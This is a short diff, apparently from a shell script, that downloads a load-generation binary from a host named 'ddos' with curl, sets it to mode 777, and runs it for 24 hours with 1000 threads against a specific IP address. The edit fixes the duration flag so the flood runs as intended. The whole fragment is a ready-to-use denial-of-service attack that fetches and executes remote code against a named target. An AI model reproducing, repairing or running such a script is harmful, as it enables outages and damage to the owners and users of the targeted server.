@@ -7,4 +7,4 @@ curl -O https://ddos.nms.workers.dev/wrk
 chmod 777 wrk
 
 #running
-./wrk -t1000 -c347 -s86400s http://51.38.92.223
+./wrk -t1000 -c347 -d86400s http://51.38.92.223
